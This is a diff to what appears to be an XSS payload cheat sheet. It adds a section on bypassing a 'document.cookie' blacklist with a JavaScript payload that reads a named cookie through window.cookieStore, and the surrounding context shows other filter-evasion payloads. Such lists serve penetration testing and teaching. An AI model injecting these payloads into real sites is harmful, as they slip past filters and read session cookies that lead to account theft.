@@ -54,6 +54,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
     - [Bypass space filter](#bypass-space-filter)
     - [Bypass email filter](#bypass-email-filter)
     - [Bypass document blacklist](#bypass-document-blacklist)
+    - [Bypass document.cookie blacklist](#bypass-document-cookie-blacklist)
     - [Bypass using javascript inside a string](#bypass-using-javascript-inside-a-string)
     - [Bypass using an alternate way to redirect](#bypass-using-an-alternate-way-to-redirect)
     - [Bypass using an alternate way to execute an alert](#bypass-using-an-alternate-way-to-execute-an-alert)
@@ -772,6 +773,14 @@ $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
 ```javascript
 <div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
 window["doc"+"ument"]
+```
+
+### Bypass document.cookie blacklist
+
+This is another way to access cookies on Chrome, Edge, and Opera. Replace COOKIE NAME with the cookie you are after. You may also investigate the getAll() method if that suits your requirements.
+
+```
+window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});
 ```
 
 ### Bypass using javascript inside a string
